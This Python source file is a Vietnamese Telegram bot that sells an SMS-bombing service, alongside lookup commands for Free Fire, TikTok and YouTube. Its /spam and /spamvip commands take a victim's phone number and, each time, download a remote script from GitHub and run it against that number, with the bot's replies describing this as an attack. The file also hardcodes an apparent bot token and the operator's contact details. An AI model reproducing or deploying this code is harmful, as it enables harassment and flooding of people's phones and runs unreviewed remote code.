import telebot
import subprocess
import sys
from requests import post, Session
import time
import datetime
import psutil
import random
import string
import os
import requests
import sqlite3
from telebot import types
from time import strftime

admin_diggory = "Trumdayhahaha" # ví dụ : để user name admin là @diggory347 bỏ dấu @ đi là đc
name_bot = "vLong zZ"
zalo = "0789041631"
web = "https://dichvukey.site/"
facebook = "no"
allowed_group_id = -1002201340697
bot=telebot.TeleBot("7298886741:AAGGmigJ82QwjdfnXXzgDnJjszWxUAMWtvE") 
print("Bot đã được khởi động thành công")
users_keys = {}
key = ""
auto_spam_active = False
last_sms_time = {}
allowed_users = []
processes = []
ADMIN_ID =  6435141966
connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()
last_command_time = {}


def check_command_cooldown(user_id, command, cooldown):
    current_time = time.time()
    
    if user_id in last_command_time and current_time - last_command_time[user_id].get(command, 0) < cooldown:
        remaining_time = int(cooldown - (current_time - last_command_time[user_id].get(command, 0)))
        return remaining_time
    else:
        last_command_time.setdefault(user_id, {})[command] = current_time
        return None

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def TimeStamp():
  now = str(datetime.date.today())
  return now


def load_users_from_database():
  cursor.execute('SELECT user_id, expiration_time FROM users')
  rows = cursor.fetchall()
  for row in rows:
    user_id = row[0]
    expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
    if expiration_time > datetime.datetime.now():
      allowed_users.append(user_id)


def save_user_to_database(connection, user_id, expiration_time):
  cursor = connection.cursor()
  cursor.execute(
    '''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
  connection.commit()
###

API_URL = 'https://scaninfo.vn/api/ff.php?id={}'

@bot.message_handler(commands=['ff'])
def handle_ff_command(message):
    try:
        # Lấy id từ lệnh /ff
        id = message.text.split()[1].strip() 

        # Gửi yêu cầu đến API để lấy thông tin
        response = requests.get(API_URL.format(id))
        
        # Kiểm tra mã trạng thái của yêu cầu
        response.raise_for_status()

        # Phân tích dữ liệu JSON từ phản hồi
        data = response.json()

        if 'Account Name' in data:
            # Trích xuất thông tin tài khoản và Guild
            account_name = data['Account Name']
            account_level = data['Account Level']
            account_region = data['Account Region']
            account_likes = data['Account Likes']
            account_xp = data['Account XP']
            account_last_login = data['Account Last Login (GMT 0530)']
            account_create_time = data['Account Create Time (GMT 0530)']
            account_booyah_pass = data['Account Booyah Pass']

            guild_name = data['Guild Information']['Guild Name']
            guild_level = data['Guild Information']['Guild Level']
            guild_leader_name = data['Guild Leader Information']['Leader Name']

            # Tạo tin nhắn phản hồi
            response_message = f"Thông tin tài khoản Free Fire:\n\n" \
                               f"Tên: {account_name}\n" \
                               f"Level: {account_level}\n" \
                               f"Khu vực: {account_region}\n" \
                               f"Lượt thích: {account_likes}\n" \
                               f"Kinh nghiệm (XP): {account_xp}\n" \
                               f"Lần đăng nhập cuối: {account_last_login}\n" \
                               f"Ngày tạo: {account_create_time}\n" \
                               f"Booyah Pass: {account_booyah_pass}\n\n" \
                               f"Thông tin Guild:\n" \
                               f"Tên Guild: {guild_name}\n" \
                               f"Level Guild: {guild_level}\n" \
                               f"Leader Guild: {guild_leader_name}"

            bot.reply_to(message, response_message)
        else:
            bot.reply_to(message, "Không tìm thấy thông tin cho ID này.")

    except IndexError:
        bot.reply_to(message, "Vui lòng nhập lệnh đúng /ff id.")
    
    except requests.exceptions.HTTPError as errh:
        bot.reply_to(message, f"Lỗi HTTP: {errh}")
    
    except requests.exceptions.ConnectionError as errc:
        bot.reply_to(message, f"Lỗi kết nối: {errc}")
    
    except requests.exceptions.Timeout as errt:
        bot.reply_to(message, f"Timeout: {errt}")
    
    except requests.exceptions.RequestException as err:
        bot.reply_to(message, f"Lỗi không xác định: {err}")

    except json.JSONDecodeError as json_err:
        bot.reply_to(message, f"Lỗi phân tích JSON: {json_err}")


###
####
start_time = time.time()

@bot.message_handler(commands=['time'])
def handle_time(message):
    uptime_seconds = int(time.time() - start_time)
    
    uptime_minutes, uptime_seconds = divmod(uptime_seconds, 60)
    bot.reply_to(message, f'Bot đã hoạt động được: {uptime_minutes} phút, {uptime_seconds} giây')
#tiktok
def fetch_tiktok_data(url):
    api_url = f'https://scaninfo.vn/api/down/tiktok.php?url={url}'
    try:
        response = requests.get(api_url)
        response.raise_for_status()  
        data = response.json()
        return data
    except requests.exceptions.RequestException as e:
        print(f"Error fetching TikTok data: {e}")
        return None

@bot.message_handler(commands=['tiktok'])
def tiktok_command(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) == 2:
        url = command_parts[1].strip()
        data = fetch_tiktok_data(url)
        
        if data and 'code' in data and data['code'] == 0:
            video_title = data['data'].get('title', 'N/A')
            video_url = data['data'].get('play', 'N/A')
            music_title = data['data']['music_info'].get('title', 'N/A')
            music_url = data['data']['music_info'].get('play', 'N/A')
            
            reply_message = f"Tiêu đề Video: {video_title}\nĐường dẫn Video: {video_url}\n\nTiêu đề Nhạc: {music_title}\nĐường dẫn Nhạc: {music_url}"
            bot.reply_to(message, reply_message)
        else:
            bot.reply_to(message, "Không thể lấy dữ liệu từ TikTok.")
    else:
        bot.reply_to(message, "Hãy cung cấp một đường dẫn TikTok hợp lệ.")


@bot.message_handler(commands=['tool'])
def send_tool_links(message):
    tool_links = [
        ("https://www.mediafire.com/file/ypkld87i2x2ynpq/gopvip.py/file", "Link Tải Tool gộp vip nhiều chế độ"),
        ("https://www.mediafire.com/file/00crrtkxut8oa7s/goliketiktokauto.py/file", "Link Tải Tool Golike Tiktok Auto Làm Nhiệm Vụ"),
        ("https://dichvukey.site", "Link Tải Tool Gộp - Source Tool Gộp")
    ]
    
    message_text = "\n".join([f"{desc}: {link}" for link, desc in tool_links])
    
    bot.reply_to(message, message_text)
####
def fetch_youtube_data(api_url):
    try:
        response = requests.get(api_url)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching data: {e}")
        return None

def print_video_info(video_data):
    video = video_data.get("ListVideo", [])[0]
    if not video:
        return "Không tìm thấy thông tin video."

    info_message = ""
    info_message += f"Thông tin video:\n"
    info_message += f"Tiêu đề: {video['snippet'].get('title', 'Không có tiêu đề')}\n"
    info_message += f"Mô tả: {video['snippet'].get('description', 'Không có mô tả')}\n"
    info_message += f"Ngày đăng: {video['snippet'].get('publishedAt', 'Không có ngày đăng')}\n"
    info_message += f"Số lượt xem: {video['statistics'].get('viewCount', '0')}\n"
    info_message += f"Số lượt thích: {video['statistics'].get('likeCount', '0')}\n"
    info_message += f"Số lượt không thích: {video['statistics'].get('dislikeCount', '0')}\n"
    info_message += f"Số lượt bình luận: {video['statistics'].get('commentCount', '0')}\n"
    info_message += f"Link video: https://www.youtube.com/watch?v={video['id']}\n"

    return info_message

@bot.message_handler(commands=['yt'])
def handle_yt_command(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui lòng nhập link video YouTube sau lệnh /yt link video .')
        return

    video_url = message.text.split()[1]


    api_url = f"https://scaninfo.vn/api/ytb/youtube.php?url={video_url}"

    youtube_data = fetch_youtube_data(api_url)

    if youtube_data:
        info_message = print_video_info(youtube_data)
        bot.reply_to(message, info_message)
    else:
        bot.reply_to(message, 'Không thể lấy thông tin từ API.')
#####

@bot.message_handler(commands=['add', 'adduser'])
def add_user(message):
   
  admin_id = message.from_user.id
  if admin_id != ADMIN_ID:
    bot.reply_to(message, 'BẠN KHÔNG CÓ QUYỀN SỬ DỤNG LỆNH NÀY')
    return

  if len(message.text.split()) == 1:
    bot.reply_to(message, 'VUI LÒNG NHẬP ID NGƯỜI DÙNG')
    return

  user_id = int(message.text.split()[1])
  allowed_users.append(user_id)
  expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
  connection = sqlite3.connect('user_data.db')
  save_user_to_database(connection, user_id, expiration_time)
  connection.close()

  bot.reply_to(
    message,
    f'NGƯỜI DÙNG CÓ ID {user_id} ĐÃ ĐƯỢC THÊM VÀO DANH SÁCH ĐƯỢC PHÉP SỬ DỤNG LỆNH /spamvip'
  )


load_users_from_database()






def is_key_approved(chat_id, key):
    if chat_id in users_keys:
        user_key, timestamp = users_keys[chat_id]
        if user_key == key:
            current_time = datetime.datetime.now()
            if current_time - timestamp <= datetime.timedelta(hours=2):
                return True
            else:
                del users_keys[chat_id]
    return False

@bot.message_handler(commands=['vlong'])
def send_welcome(message):
   
   
    username = message.from_user.username
    bot.reply_to(message, f'''
┌───⭓ {name_bot}
│» Xin chào @{username}
│» /vlong : Lệnh trợ giúp
│» /admin : Thông tin admin
│» /spam : Spam SMS FREE
│» /spamvip : Spam SMS VIP - Mua Vip 30k/Tháng
│» info : Kiểm Tra Thông Tin fb bỏ /
│» /yt : Kiểm Tra Thông Tin VD YOUTUBE .
│» /id : Lấy ID Tele Của Bản Thân
│» /voice : Đổi Văn Bản Thành Giọng Nói.
│» /ff : Check Thông Tin Nick Free Fire.
│» /tiktok : Check Thông Tin - Tải Video Tiktok.
│» /tool : Tải tool gộp - Golike Auto - source gộp
│» /time : check thời gian hoạt động
│» /ad : có bao nhiêu admin
│» Lệnh Cho ADMIN
│» /add : Thêm người dùng sử dụng /spamvip
└───────────⧕
    ''')
@bot.message_handler(commands=['admin'])
def diggory(message):
     
    username = message.from_user.username
    diggory_chat = f'''
┌───⭓ {name_bot}
│» Xin chào @{username}
│» Bot Spam : vLongzZ x Mạnh Offcal
│» Zalo: {zalo}
│» Website: {web}
│» Telegram: @{admin_diggory}
└──────────────
    '''
    bot.send_message(message.chat.id, diggory_chat)


last_usage = {}

@bot.message_handler(commands=['spam'])
def spam(message):
    user_id = message.from_user.id
    
    current_time = time.time()
    if user_id in last_usage and current_time - last_usage[user_id] < 25:
        bot.reply_to(message, f"Vui lòng đợi {25 - (current_time - last_usage[user_id]):.1f} giây trước khi sử dụng lệnh lại.")
        return
    
    last_usage[user_id] = current_time

    params = message.text.split()[1:]

    if len(params) < 2:
        bot.reply_to(message, "Vui lòng nhập đầy đủ thông tin.")
        return

    sdt = params[0]
    count = params[1]

    if not count.isdigit():
        bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng nhập một số nguyên dương.")
        return
    
    count = int(count)
    
    if count > 5:
        bot.reply_to(message, "Số lần spam không được vượt quá 5 lần.")
        return

    if sdt in blacklist:
        bot.reply_to(message, f"Số điện thoại {sdt} đã bị cấm spam.")
        return

    diggory_chat3 = f'''
┌──────⭓ {name_bot}
│ Spam: Thành Công 
│ Số Lần Spam Free: {count}
│ Đang Tấn Công : {sdt}
└─────────────
    '''

    script_url = "https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/khai.py"
    try:
        response = requests.get(script_url)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name
            process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
            bot.send_message(message.chat.id, diggory_chat3)
        else:
            bot.reply_to(message, f"Không thể lấy script từ {script_url}. Mã lỗi: {response.status_code}")
    except Exception as e:
        bot.reply_to(message, f"Lỗi khi lấy script từ {script_url}: {str(e)}")

blacklist = ["0789041631", "112", "113", "114", "115", "116", "117", "118", "119", "0", "1", "2", "3", "4", "5"]
import requests
import tempfile

@bot.message_handler(commands=['spamvip'])
def supersms(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, 'Hãy Mua Vip Để Sử Dụng.')
        return

    if len(message.text.split()) == 1:
        bot.send_message(chat_id=message.chat.id, text="Vui lòng nhập số điện thoại cần spam.")
        return
     
    params = message.text.split()
    username = message.from_user.username
    
    diggory_chat = f'''
┌───⭓ {name_bot}
│» Reply User: @{username}
│» Vui lòng nhập đầy đủ thông tin
│» Lệnh ví dụ là /spam 0123456789 30  (số lần spam)
└───────
    '''
    
    if len(params) < 3:
        bot.reply_to(message, diggory_chat)
        return

    sdt = params[1]
    count = params[2]

    if not count.isdigit():
        bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng nhập một số nguyên dương.")
        return
    
    count = int(count)
    
    if count > 30:
        bot.reply_to(message, "Số lần spam không được vượt quá 30 lần.")
        return

    if sdt in blacklist:
        bot.reply_to(message, f"Số điện thoại {sdt} đã bị cấm spam.")
        return

    chat_id = message.chat.id
    
    diggory_chat3 = f'''
┌──────⭓ {name_bot}
│ User: @{username}
│ Spam: Thành Công 
│ Số Lần Spam VIP: {count}
│ Đang Tấn Công : {sdt}
└─────────────
    '''
    
    # Fetch khai.py from the web URL
    script_url = "https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/khai.py"
    try:
        response = requests.get(script_url)
        if response.status_code == 200:
            # Save the script content to a temporary file
            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name
            # Execute the fetched script
            process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
            bot.send_message(chat_id, diggory_chat3)
        else:
            bot.reply_to(message, f"Không thể lấy script từ {script_url}. Mã lỗi: {response.status_code}")
    except Exception as e:
        bot.reply_to(message, f"Lỗi khi lấy script từ {script_url}: {str(e)}")

API_URL = "https://scaninfo.vn/api/gg/voice.php?text={}"
@bot.message_handler(commands=['voice'])
def handle_voice_command(message):
    try:
        text = message.text.split('/voice ', 1)[1].strip()
        api_request_url = API_URL.format(requests.utils.quote(text))
        response = requests.get(api_request_url)
        if response.status_code == 200:
            audio_data = response.content
            if audio_data:
                bot.send_voice(message.chat.id, audio_data, reply_to_message_id=message.message_id)
            else:
                bot.reply_to(message, f"@{message.from_user.username} Không thể tạo giọng nói từ văn bản này.")
        else:
            bot.reply_to(message, f"@{message.from_user.username} Đã xảy ra lỗi khi chuyển đổi văn bản thành giọng nói.")
    except IndexError:
        bot.reply_to(message, f"@{message.from_user.username} Vui lòng nhập văn bản sau lệnh /voice.")
    
    except Exception as e:
        bot.reply_to(message, f"@{message.from_user.username} Lỗi không xác định: {str(e)}")
ADMIN_NAME = "vLong zZ"
@bot.message_handler(commands=['ad'])
def send_admin_info(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(message.chat.id, f"Tất Nhiên Là Có 1 AD Đó Là : {ADMIN_NAME}\nID: `{ADMIN_ID}`", parse_mode='Markdown')
    else:
        bot.reply_to(message, "Bạn không có quyền truy cập vào lệnh này!")
@bot.message_handler(func=lambda message: message.text.isdigit())
def copy_user_id(message):
    bot.send_message(message.chat.id, f"ID của bạn đã được sao chép: `{message.text}`", parse_mode='Markdown')
ADMIN_NAME = "vLong zZ"
@bot.message_handler(commands=['id'])
def get_user_id(message):
    if len(message.text.split()) == 1:  
        user_id = message.from_user.id
        bot.reply_to(message, f"ID của bạn là: `{user_id}`", parse_mode='Markdown')
    else:  
        username = message.text.split('@')[-1].strip()
        try:
            user = bot.get_chat(username)  # Lấy thông tin người dùng từ username
            bot.reply_to(message, f"ID của {user.first_name} là: `{user.id}`", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, "Không tìm thấy người dùng có username này.")

bot.polling()
